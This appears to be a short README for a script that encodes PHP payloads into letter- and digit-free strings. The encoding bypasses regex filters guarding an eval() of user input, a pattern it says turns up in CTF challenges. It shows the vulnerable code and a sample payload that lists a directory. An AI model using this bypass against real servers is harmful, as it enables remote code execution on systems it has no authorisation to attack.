# PHP eval() with regex restriction exploit

In some CTF, or maybe real code, we seen sometimes this kind of vulnerabilies : 

```php
if( !preg_match('/[a-z]/i', $_GET['evalThis'] ) ){
	eval( $_GET['evalThis'] );
} 
```

Or the old version with the **e** option in preg_match : 

```php
if( !preg_match('/[a-z]/ie', $_GET['evalThis'] ) ){
	echo( $_GET['evalThis'] );
} 
```

The write of some payloads are very very long, like you can seen to this URL : https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/

So i'll decided to make it simple an write a script to convert, our PHP payload code to string can bypass this restriction.

To use it, that was simple, edit the code modify this two lines : 

```php
$payloadToEncode  = '$_=\'scandir\';$__=\'var_dump\';$__($_(\'./\'));';
$regexExcludeChar = '/[a-z]|[0-9]/i ';
```

And run the php code with php-cli or in your webserveur.

